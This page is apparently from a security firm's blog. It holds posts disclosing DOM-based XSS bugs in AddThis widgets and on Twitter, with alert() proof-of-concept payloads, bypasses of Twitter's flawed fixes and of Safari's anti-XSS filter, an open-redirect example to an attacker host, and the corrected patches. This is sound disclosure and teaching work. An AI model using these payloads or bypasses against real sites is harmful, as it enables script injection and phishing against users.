Next step is to check where this issue has been found. This is easy, looking at the source history:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPrc7gkxa-elcDVF0IWCUY_lRdygFcImS_D_LXiPYaZpZCz62f0W0iya4WbnK0LRDlkmVQi2xpyiyAVVI4GHq_T9NdvourWMCq8Gr5JpJPH1YWu7I0GwmA6VcuoSFwFiuqZFnujLZt6g/s400/history.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPrc7gkxa-elcDVF0IWCUY_lRdygFcImS_D_LXiPYaZpZCz62f0W0iya4WbnK0LRDlkmVQi2xpyiyAVVI4GHq_T9NdvourWMCq8Gr5JpJPH1YWu7I0GwmA6VcuoSFwFiuqZFnujLZt6g/s1600/history.png)
Exact location of the issue is:

* **http://www.vulnerablewebsite.con/webpage.aspx?menuid=3#injectedstring<>”’**

Source history is a simplified call stack that shows the content of controllable strings.
Location.href can be controlled and the value is showed up in light green, after this string is concatenated with another string by left and by right.
As it is possible to see from the above picture, it’s also possible to check if there are validator functions in place by injecting HTML patterns after the # (hash); in this case I injected the pattern #injectedstring<>”’ after the vulnerable URL. Using the “Hash” sign is important because anything coming after it will not be sent to the server.
It’s possible to see from the last line that #injectedstring<>"' is not encoded (typical encoded string is in the form of: #injectedstring%3c%22%27).
By supplying now the correct exploit it is possible to turn the vulnerability into a reflected DOM cross site scripting attack:

*Standard HTML Injection Payload:*

* **<img/src="aaa"/onerror="alert('DomXss Found!')">**

Important Note: Thanks to DOMinatorPro Browser emulation feature we can mimic different browser insecure behaviors. This permits to show developers the vulnerability inside DOMinatorPro/Firefox, even if the previous exploit works only under Internet Explorer.

#### Call Stack

Now for a developer it is time to open the “Call Stack”:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEius2T1Ci1j29sCf6XX_mQ78HykShpYmAmYLIErM2VIVGla19GoFLgGUetNgZc6nEdrlnkpr-mpQynBVSR_FKtE9Ml4xDEdSDh8L5SeZyqc3L5smu8bKLw2JNlOygFxQJmuo7lkrUGmHw/s400/callstack.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEius2T1Ci1j29sCf6XX_mQ78HykShpYmAmYLIErM2VIVGla19GoFLgGUetNgZc6nEdrlnkpr-mpQynBVSR_FKtE9Ml4xDEdSDh8L5SeZyqc3L5smu8bKLw2JNlOygFxQJmuo7lkrUGmHw/s1600/callstack.png)
The Call Stack interactively shows where the vulnerability is with the correct line. It is possible to see “document.location.href” is not escaped properly.
It’s very important to output encode the value before it is displayed.
#### Fixing

Correct fixing at line 116:
•    Use the “encodeURIComponent()” function.

By
Giorgio Fedon

at

[3:20 AM](https://blog.mindedsecurity.com/2012/09/analysis-of-dom-xss-vulnerability-in.html "permanent link")

[3 comments
:](https://blog.mindedsecurity.com/2012/09/analysis-of-dom-xss-vulnerability-in.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=7885927123740178257&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=7885927123740178257&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
,
[DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
,
[Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
,
[web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
,
[Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)

## Tuesday, September 25, 2012

# [Temporary Patch for a Dom Xss 0day in Addthis.com Widgets](https://blog.mindedsecurity.com/2012/09/temporary-patch-for-dom-xss-0day-in.html)

Note: Addthis.com fixed this issue yesterday 26/09/12 thanks to Addthis.com team for fixing it so rapidly!

Including a Javascript code in your homepage from another Website is a very common practice.
#### "Third party scripts are a *hidden-potential* security threat"

Addthis.com for example provides very useful scripts to help enhancing a website with the most used social media networks. From Wikipedia: “ AddThis is a widely used social bookmarking service that can be integrated into a website with the use of a web widget. Once it is added, visitors to the website can bookmark an item using a variety of services, such as Facebook, MySpace, Google Bookmarks, Pinterest, and Twitter.[2]”.

AddThis social plugins and analytics are used by *"over 14 million sites worldwide”* (2007).

You just need to **“add this”**:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFknnXpHNaXxoGddZnJvrX-WNbQTS-C0IVSBht5iJ1BecuJDB_KvWv161ZQlLu3YknOGAuoN5cl2cqtdDhfQ5ypjzMOz62I6TZi2hag3kpJ8akF4rmvxv2znbwJJr5CaZ7LNSMqChGKA/s400/addthis.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFknnXpHNaXxoGddZnJvrX-WNbQTS-C0IVSBht5iJ1BecuJDB_KvWv161ZQlLu3YknOGAuoN5cl2cqtdDhfQ5ypjzMOz62I6TZi2hag3kpJ8akF4rmvxv2znbwJJr5CaZ7LNSMqChGKA/s1600/addthis.png)

There are many advantages in doing this:

•    code will be updated by the maintainer

•    bugs will be fixed silently

•    … many others

Unfortunately it also hides several drawbacks:

•    *Security vulnerabilities in referenced scripts **will affect your website***

During the past year we analyzed many Javascript codes belonging to tracking cookies. Some of those analysis have been pretty interesting. During 2011 we reported for example several issues in Omniture Catalyst Javascript code, with documented proof of concept code (<http://blog.mindedsecurity.com/2011/04/god-save-omniture-quine.html>)

### The DomXss Vulnerability

DOM-based Cross-Site Scripting is the de-facto name for XSS bugs which are the result of active browser-side content on a page, typically JavaScript, obtaining user input and then doing something unsafe with it which leads to execution of injected code. This document only discusses JavaScript bugs which lead to XSS.

More information about DomXss vulnerabilities can be found here:

•    <https://www.owasp.org/index.php/DOM_Based_XSS>

•    <http://code.google.com/p/domxsswiki/wiki/Introduction>

####

#### DomXss in Addthis.com Widgets

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1b_QF8yPglCiLstpvPIbdem0VeERorjs-SggJ_s9lkbEVbqY4bS3n5BhSTzK2bJw6NfKnqjKCltxgWs8uwpUkqJq8gTn6QE8fLVZb1iJwXMowRZ5dXhnRMH54SHd9WqvV-xOBDAqS8A/s400/addowned.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1b_QF8yPglCiLstpvPIbdem0VeERorjs-SggJ_s9lkbEVbqY4bS3n5BhSTzK2bJw6NfKnqjKCltxgWs8uwpUkqJq8gTn6QE8fLVZb1iJwXMowRZ5dXhnRMH54SHd9WqvV-xOBDAqS8A/s1600/addowned.png)

Details of the vulnerability have been temporarily omitted because the number of affected websites is huge. We did this for giving enough time to the vendor for fixing the issues (full details have been sent to support@addthis.com).

Note from 26/09: Investigating further, it seems that vulnerability is not always triggered; this may depends from the templates used

Note from 27/09: Details about the issue can be found here

* <http://blog.mindedsecurity.com/2012/09/analysis-of-dom-xss-vulnerability-in.html>

Vulnerability has been found using ***DominatorPro,*** our DomXss Analyzer. Dominator is an opensource project with several extensions (some of these are commercial) and can be downloaded for free at

* [http://dominator.mindedsecurity.com](http://dominator.mindedsecurity.com/)

### A temporary patch

You can make this temporary patch by configuration for protecting your website in the meantime that the vulnerable code will be fixed. Note: this patch is not for the vulnerability itself but will prevent it from being easily exploited.

To patch a vulnerable AddThis.com Widget manually populate the following property:

•    **addthis:url**

For more information visit:

* <http://support.addthis.com/customer/portal/articles/381242-url-title>

####

####

#### Example:

```

...
<div addthis:url="http://example.com" class="addthis_toolbox addthis_default_style" nbsp="nbsp">
...

```

If you don’t *add this*, you are potentially vulnerable.

By
Giorgio Fedon

at

[1:43 PM](https://blog.mindedsecurity.com/2012/09/temporary-patch-for-dom-xss-0day-in.html "permanent link")

[No comments
:](https://blog.mindedsecurity.com/2012/09/temporary-patch-for-dom-xss-0day-in.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=4120119136701649162&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4120119136701649162&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4120119136701649162&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4120119136701649162&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4120119136701649162&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4120119136701649162&target=pinterest "Share to Pinterest")

Labels:
[Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
,
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
,
[DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
,
[Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
,
[Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
,
[Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
,
[web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
,
[Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)

## Wednesday, September 22, 2010

# [A Twitter DomXss, a wrong fix and something more](https://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-something.html)

A Twitter DOM Xss

It seems that twitter new site, introduced some issue resulting in a worm exploiting a stored Xss.
They also added some new JavaScript in their pages which I casually saw while searching in the html for the worm payload.

The code was the following :
 `//<![CDATA[
(function(g){var a=location.href.split("#!")[1];if(a){g.location=g.HBR=a;}})(window);
//]]>`

Do you spot the issue?
It search for "#!" in the Url and assign the content after that to the window.location object. And it is present in (almost?) every page on twitter.com main site.

According to [DOM Xss Wiki](https://code.google.com/p/domxsswiki/wiki/Introduction) the location object is one of the first objects identified for being dangerous as it is both a [source](https://code.google.com/p/domxsswiki/wiki/LocationSources) and a [sink](https://code.google.com/p/domxsswiki/wiki/SetLocationSink).

In fact the DOM Based Xss will be triggered by simply going to:
> http://twitter.com/#!javascript:alert(document.domain);

as shown in the following screenshot:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFUp5lML7D67CTl5NhdtuyGK1wypojgVqpQWC30_s5OfkRVoYoWLbT14VIUHAYiEfz72SHQguMq57wu13ZXWsbWeuP6EtE1ewgDMKcINaua1x46cbLMeQO2_DywViWEMSvfD_9AaBTFGK/s400/TwitterXss1.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFUp5lML7D67CTl5NhdtuyGK1wypojgVqpQWC30_s5OfkRVoYoWLbT14VIUHAYiEfz72SHQguMq57wu13ZXWsbWeuP6EtE1ewgDMKcINaua1x46cbLMeQO2_DywViWEMSvfD_9AaBTFGK/s1600/TwitterXss1.jpg)
Very simple and effective.
After spotting the issue, I sent an email to twitter warning them about it but not without apologizing for finding it in the middle of worm spreading.

The response was quite funny because, even if the issue was very straightforward, they cannot reproduce it because of safari antiXss filter.

Obviously I checked on every browser but Safari ... and guess what ? Safari blocked it! We'll talk about it later.

So I told them that it worked on Firefox, Chrome and Opera and after that they confirmed the issue, thanked me and so long. No more mails.

A Wrong Fix (To Replace or not to Replace )
Thanks [Gaz](http://www.thespanner.co.uk/) for the title.

After some hours, I found the following fix:

 `var c = location.href.split("#!")[1];
if (c) {
window.location = c.replace(":", "");
} else {
return true;
}`

What's wrong with that?

1. Data Validation. 'c' is not validated as directed, that means every character but ":" is allowed. Data validation is about limiting the set of every possible input to an expected subset. Question is do we need to allow everything but one char?
2. BlackListing. It is widely known that blacklisting could lead to bypasses if it is done loosely.
3. No output encoding is applied. Since location assignment calls the URL Parser the context is quite known and have it's own metacharacters and structure. encoding in the URLParser context is also known as URLEncoding.
4. The use of replace ... let's see the doc (ECMA Specification):

> [...]
> String.prototype.replace (searchValue, replaceValue)
> [...]
> If searchValue is not a regular expression, let searchString be ToString(searchValue) and search
> string for the first occurrence of searchString. Let m be 0.
> [...]

The analysis tells that the fix is wrong, and in fact is possible to bypass the replace by doubling the colon ':' char.

> http://twitter.com/#!javascript::alert(document.domain);

See the '::' ?
The replace just deletes the first occurrence of ':' so we just add two ':'.
It has also the drawback to bypass several client side filters, Safari included.

So I wrote again to twitter:
> Hey,
> that is not correct!
>
> (function(g){var
> a=location.href.split("#!")[1];if(a){g.location=g.HBR=a.replace(":","");}})(window);
>
> will allow:
>
> twitter.com/#!javascript::alert(1)
>
> see the :: ?
> I'd suggest you to urlencode a
> or
> if it breaks things use a whitelist of allowed chars before going to assign a to the location.
>
> Another fix could be using:
> location.pathname=a
> or
> location.search=a
>
> which at least let you stay on the same domain (not sure it works on every browser), but I don't know if it's ok for twitter.
>
> It's not a easy task, as usual :)
>
> Also, please, send me an email when the fix is done, cause I don't want to set a cron job to get when the fix is deployed.
> ...

This morning I found the following fix (no email from them though):
 `(function(g){
var a=location.href.split("#!")[1];
if(a){
g.location=g.HBR=a.replace(":","","g");
}
})(window);`

Which resolves the multiple colons attack, but, IMHO, it is not really correct because of what I've said previously.

The Safari Filter Bypass (the something more part)

As a side consequence of the twitter DOM Xss I found myself playing with the Safari anti Xss filter.
It seems that it tries to find a match between the payload used in the assignment to location and the values in the Url in browser location bar.
After checking a bit in order to understand the behavior of the filter, I figured out that it urldecode the Url and then search for the pattern.
The problem comes because of that.
In fact since the + is replaced to a space character, then
 `twitter.com?#!javascript:1+alert(1)`

becomes:
 `twitter.com?#!javascript:1 alert(1)`
which obviously won't ever match the needle:
 `"javascript:1+alert(1)"`

And there you have the bypass.

Update (24/09/2010)

Twitter finally set a working patch to the second wrong fix (see comments).
 `(function(g){var a=location.href.split("#!")[1];if(a){g.location=g.HBR=a.replace(/:/gi,"");}})(window);`

Still not the best,IMHO, but at least it works...well, until there will be a bypass.
Also, since the patch just blocks ':' still remains an arbitrary redirect issue.
> twitter.com#!//attacker.ltd/with/a/page/similar/to/twitterlogin/page

Update (25/09/2010)

As it was to be expected, there is a bypass (already public) which works on IE8 (~26% market share).
I found it yesterday independently by Gareth Heyes and Yusuke Hasegawa and reported to Twitter security team.
The bypass takes advantage of the html entity version of ':' which is &#58; or &#x3a;.
Internet Explorer 8, unlikely other browsers, when finds an entity converts it to its original value when it is assigned to the location object.
 `location="&x#58;"`
will let the browser to go to ':' and not to literally "&x58;"
So, when the patch tries to replace ':' to an empty value, it won't find it, but the assignment to the location will convert it again to a colon.

 `twitter.com#!javascript&x58;alert(1)`
is still valid (not in blacklist).

Finally, after writing a new mail to twitter security team, they came with a good defensive patch:
 `(function(g){var a=location.href.split("#!")[1];if(a){window.location.hash = "";g.location.pathname = g.HBR = a;}})(window);`
As I suggested in my first email.
What happens here is that the assignment is performed on the correct attribute (the pathname) so that it is parsed in the right context with no possible bypasses to force a new URI scheme.
Now everything \*should\* be really ok... well, if all browsers will behave in the right way!

By

[Stefano Di Paola](https://www.blogger.com/profile/18241677936736054546 "author profile")

at

[11:24 PM](https://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-something.html "permanent link")

[13 comments
:](https://blog.mindedsecurity.com/2010/09/twitter-domxss-wrong-fix-and-something.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=2961562714436136765&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2961562714436136765&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2961562714436136765&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2961562714436136765&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2961562714436136765&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=2961562714436136765&target=pinterest "Share to Pinterest")

Labels:
[Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
,
[Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
,
[twitter](https://blog.mindedsecurity.com/search/label/twitter)
,
[Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
,
[Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)

[Older Posts](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting?updated-max=2010-09-22T23:24:00-07:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* Cross Site Scripting

  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
